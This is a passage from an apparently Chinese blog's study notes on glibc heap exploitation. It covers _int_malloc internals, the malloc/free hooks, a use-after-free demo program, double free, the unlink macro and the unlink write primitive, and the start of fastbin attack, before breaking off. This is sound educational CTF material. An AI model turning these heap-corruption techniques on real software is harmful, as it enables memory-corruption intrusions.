attack产生的原因，一旦我们绕过之前的检查到达这里，在可以控制victim-&gt;bk即bck的情况下我们可以往bck-&gt;fd写入unsorted_chunks(av)即*(bck+<span class="number">0x10</span>)=unsorted(av)。</span><br><span class="line"></span><br><span class="line">继续走，下面一个代码块是指如果我们请求的nb同victim的大小恰好吻合，就直接返回这个块给用户。</span><br><span class="line"></span><br><span class="line">如果之前的条件都不满足，意味着目前的victim不能满足用户的需求，需要根据其<span class="built_in">size</span>放入small bin或large bin的链，其中在后者实现中存在large bin attack，由于同本文无关就不再进一步展开，最后是unlink将victim彻底解链。</span><br></pre></td></tr></table></figure>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="comment">//size check</span></span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;<span class="built_in">size</span> &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;<span class="built_in">size</span> &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">"malloc(): memory corruption"</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          <span class="built_in">size</span> = chunksize (victim);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line">          <span class="comment">//last remainder first</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (<span class="built_in">size</span>) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">              remainder_size = <span class="built_in">size</span> - nb;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              <span class="comment">//cut and put the remained part back to unsorted list</span></span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="comment">//return to user</span></span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          <span class="comment">//unsorted bin attack</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">size</span> == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, <span class="built_in">size</span>);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;<span class="built_in">size</span> |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (<span class="built_in">size</span>))</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (<span class="built_in">size</span>);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (<span class="built_in">size</span>);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  <span class="built_in">size</span> |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert ((bck-&gt;bk-&gt;<span class="built_in">size</span> &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (<span class="built_in">size</span>) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (bck-&gt;bk-&gt;<span class="built_in">size</span>))</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert ((fwd-&gt;<span class="built_in">size</span> &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) <span class="built_in">size</span> &lt; fwd-&gt;<span class="built_in">size</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                          assert ((fwd-&gt;<span class="built_in">size</span> &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) <span class="built_in">size</span> == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;<span class="built_in">size</span>)</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">          <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></li></ul><pre><code>**一个宏****根据 chunk 的大小统一地获得 chunk 所在的索引**<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define bin<span class="constructor">_index(<span class="params">sz</span>)</span>                                                          \</span><br><span class="line">    ((<span class="keyword">in</span><span class="constructor">_smallbin_range(<span class="params">sz</span>)</span>) ? smallbin<span class="constructor">_index(<span class="params">sz</span>)</span> : largebin<span class="constructor">_index(<span class="params">sz</span>)</span>)</span><br></pre></td></tr></table></figure></code></pre><h3 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="_libc_malloc"></a>_libc_malloc</h3><p>_int_malloc()函数是 申请内存块的核心</p><p><strong>用户申请的字节一旦进入申请内存函数中就变成了无符号整数</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wapper for int_malloc</span></span><br><span class="line"><span class="keyword">void</span> *__libc_malloc(<span class="keyword">size_t</span> bytes) &#123;</span><br><span class="line">    mstate ar_ptr;</span><br><span class="line">    <span class="keyword">void</span> * victim;</span><br><span class="line">    <span class="comment">// 检查是否有内存分配钩子，如果有，调用钩子并返回.</span></span><br><span class="line">    <span class="keyword">void</span> *(*hook)(<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *) = atomic_forced_read(__malloc_hook);</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS(<span class="number">0</span>));</span><br></pre></td></tr></table></figure><h3 id="malloc-hook"><a href="#malloc-hook" class="headerlink" title="malloc_hook"></a>malloc_hook</h3><img src="/images/Heap/image-20200723124734877.png" alt="image-20200723124734877" style="zoom:150%;" /><h3 id="realloc-hook"><a href="#realloc-hook" class="headerlink" title="realloc_hook"></a>realloc_hook</h3><img src="/images/Heap/image-20200723124750043.png" alt="image-20200723124750043" style="zoom:200%;" /><h3 id="free-hook"><a href="#free-hook" class="headerlink" title="free_hook"></a>free_hook</h3><img src="/images/Heap/image-20200723124806785.png" alt="image-20200723124806785" style="zoom:200%;" /><h2 id="UAF-use-after-free"><a href="#UAF-use-after-free" class="headerlink" title="UAF(use after free)"></a>UAF(use after free)</h2><h3 id="原理-¶"><a href="#原理-¶" class="headerlink" title="原理 ¶"></a>原理 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/use_after_free-zh/#_1" target="_blank" rel="noopener">¶</a></h3><p>简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况</p><ul><li><p>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</p></li><li><p>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</p></li><li><p>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</p><p>  example:</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">include &lt;stdio.h&gt;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">name</span> &#123;</span></span><br><span class="line">  <span class="keyword">char</span> *myname;</span><br><span class="line">  <span class="keyword">void</span> (*func)(<span class="keyword">char</span> *str);</span><br><span class="line">&#125; NAME;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myprint</span><span class="params">(<span class="keyword">char</span> *str)</span> </span>&#123; <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, str); &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printmyname</span><span class="params">()</span> </span>&#123; <span class="built_in">printf</span>(<span class="string">"call print my name\n"</span>); &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  NAME *a;</span><br><span class="line">  a = (NAME *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct name));</span><br><span class="line">  a-&gt;func = myprint;</span><br><span class="line">  a-&gt;myname = <span class="string">"I can also use it"</span>;</span><br><span class="line">  a-&gt;func(<span class="string">"this is my function"</span>);</span><br><span class="line">  <span class="comment">// free without modify</span></span><br><span class="line">  <span class="built_in">free</span>(a);</span><br><span class="line">  a-&gt;func(<span class="string">"I can also use it"</span>);</span><br><span class="line">  <span class="comment">// free with modify</span></span><br><span class="line">  a-&gt;func = printmyname;</span><br><span class="line">  a-&gt;func(<span class="string">"this is my function"</span>);</span><br><span class="line">  <span class="comment">// set NULL</span></span><br><span class="line">    </span><br><span class="line">  a = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"this pogram will crash...\n"</span>);</span><br><span class="line">  a-&gt;func(<span class="string">"can not be printed..."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"></span><br><span class="line">```cmd</span><br><span class="line">this is my <span class="function"><span class="keyword">function</span></span></span><br><span class="line">I can also <span class="keyword">use</span> it</span><br><span class="line"><span class="keyword">call</span> <span class="built_in">print</span> my <span class="keyword">name</span></span><br><span class="line">this pogram will crash...</span><br><span class="line">segmentation fault (core dumped）</span><br></pre></td></tr></table></figure></li></ul><p>​    </p><h3 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h3><p><img src="/images/Heap/2015112403492645777p1.jpg" alt="picture_p13"></p><p>将一个指针释放两次</p><h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><p>unlink 的目的是把一个双向链表中的空闲块拿出来</p><p>free时和目前物理相邻的free chunk 进行何合并</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">unlink</span> 用来将一个双向链表（只存储空闲的 chunk）中的一个元素取出来，可能在以下地方使用</span><br><span class="line"></span><br><span class="line"><span class="symbol">malloc</span></span><br><span class="line">从恰好大小合适的 large <span class="keyword">bin </span>中获取 chunk。</span><br><span class="line">这里需要注意的是 fastbin 与 small <span class="keyword">bin </span>就没有使用 unlink，这就是为什么漏洞会经常出现在它们这里的原因。</span><br><span class="line">依次遍历处理 unsorted <span class="keyword">bin </span>时也没有使用 unlink 。</span><br><span class="line">从比请求的 chunk 所在的 <span class="keyword">bin </span>大的 <span class="keyword">bin </span>中取 chunk。</span><br><span class="line"><span class="symbol">free</span></span><br><span class="line">后向合并，合并物理相邻低地址空闲 chunk。</span><br><span class="line">前向合并，合并物理相邻高地址空闲 chunk（除了 top chunk）。</span><br><span class="line"><span class="symbol">malloc_consolidate</span></span><br><span class="line">后向合并，合并物理相邻低地址空闲 chunk。</span><br><span class="line">前向合并，合并物理相邻高地址空闲 chunk（除了 top chunk）。</span><br><span class="line"><span class="symbol">realloc</span></span><br><span class="line">前向扩展，合并物理相邻高地址空闲 chunk（除了 top chunk）。</span><br></pre></td></tr></table></figure><p><img src="/images/Heap/unlink_smallbin_intro.png" alt="img"></p><p><img src="/images/Heap/2015112403492885899p2-1586952827711.jpg" alt="picture_p14"></p><p>最初的unlink的实现,没有以下检查代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (<span class="string">"corrupted size vs. prev_size"</span>);               \</span><br><span class="line"><span class="comment">// 检查 fd 和 bk 指针(双向链表完整性检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);  \</span><br><span class="line"></span><br><span class="line">  <span class="comment">// largebin 中 next_size 双向链表完整性检查 </span></span><br><span class="line">              <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)              \</span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">              malloc_printerr (check_action,                                      \</span><br><span class="line">                               <span class="string">"corrupted double-linked list (not small)"</span>,    \</span><br><span class="line">                               P, AV);</span><br></pre></td></tr></table></figure><p>完整版unlink宏</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="comment">// unlink p</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line">    <span class="comment">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (<span class="string">"corrupted size vs. prev_size"</span>);               \</span><br><span class="line">    FD = P-&gt;fd;                                                                      \</span><br><span class="line">    BK = P-&gt;bk;                                                                      \</span><br><span class="line">    <span class="comment">// 防止攻击者简单篡改空闲的 chunk 的 fd 与 bk 来实现任意写的效果。</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">      malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);  \</span><br><span class="line">    <span class="keyword">else</span> &#123;                                                                      \</span><br><span class="line">        FD-&gt;bk = BK;                                                              \</span><br><span class="line">        BK-&gt;fd = FD;                                                              \</span><br><span class="line">        <span class="comment">// 下面主要考虑 P 对应的 nextsize 双向链表的修改</span></span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))                              \</span><br><span class="line">            <span class="comment">// 如果P-&gt;fd_nextsize为 NULL，表明 P 未插入到 nextsize 链表中。</span></span><br><span class="line">            <span class="comment">// 那么其实也就没有必要对 nextsize 字段进行修改了。</span></span><br><span class="line">            <span class="comment">// 这里没有去判断 bk_nextsize 字段，可能会出问题。</span></span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;                      \</span><br><span class="line">            <span class="comment">// 类似于小的 chunk 的检查思路</span></span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)              \</span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">              malloc_printerr (check_action,                                      \</span><br><span class="line">                               <span class="string">"corrupted double-linked list (not small)"</span>,    \</span><br><span class="line">                               P, AV);                                              \</span><br><span class="line">            <span class="comment">// 这里说明 P 已经在 nextsize 链表中了。</span></span><br><span class="line">            <span class="comment">// 如果 FD 没有在 nextsize 链表中</span></span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;                                      \</span><br><span class="line">                <span class="comment">// 如果 nextsize 串起来的双链表只有 P 本身，那就直接拿走 P</span></span><br><span class="line">                <span class="comment">// 令 FD 为 nextsize 串起来的</span></span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                                      \</span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;                      \</span><br><span class="line">                <span class="keyword">else</span> &#123;                                                              \</span><br><span class="line">                <span class="comment">// 否则我们需要将 FD 插入到 nextsize 形成的双链表中</span></span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                              \</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                              \</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                              \</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                              \</span><br><span class="line">                  &#125;                                                              \</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;                                                              \</span><br><span class="line">                <span class="comment">// 如果在的话，直接拿走即可</span></span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;                      \</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;                      \</span><br><span class="line">              &#125;                                                                      \</span><br><span class="line">          &#125;                                                                      \</span><br><span class="line">      &#125;                                                                              \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FD=P-&gt;fd = target addr <span class="number">-12</span></span><br><span class="line">BK=P-&gt;bk = expect value</span><br><span class="line">FD-&gt;bk = BK，即 *(target addr<span class="number">-12</span>+<span class="number">12</span>)=BK=expect value</span><br><span class="line">BK-&gt;fd = FD，即 *(expect value +<span class="number">8</span>) = FD = target addr<span class="number">-12</span></span><br></pre></td></tr></table></figure><h3 id="当前的unlink"><a href="#当前的unlink" class="headerlink" title="当前的unlink"></a>当前的unlink</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fd bk</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);  \</span><br></pre></td></tr></table></figure><ul><li><p>FD-&gt;bk = target addr - 12 + 12=target_addr</p></li><li><p>BK-&gt;fd = expect value + 8</p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><ol><li>UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针</li><li>已知位置存在一个指针指向可进行 UAF 的 chunk</li></ol></li></ul><p>效果 ： 使得指向UAF chunk的指针的地址为ptr-0x18</p><p>思路：</p><ol><li>修改 fd 为 ptr - 0x18</li><li>修改 bk 为 ptr - 0x10</li><li>触发 unlink</li></ol><p>ptr处的指针会变为ptr-0x18</p><h2 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h2><p>free时的检查</p><p> 0.2*size_sz&lt;next chunksize&lt;sys memory</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>利用了fastbin的fd指针指向下一个chunk</p><p>fastbin 仅由一直指向最后一个chunk的指针fd，这个指针就决定了下一次要分配的chunk地址</p><p>在覆盖fd指针时候就可以实现向任意地址分配堆块</p><h3 id="条件"><a 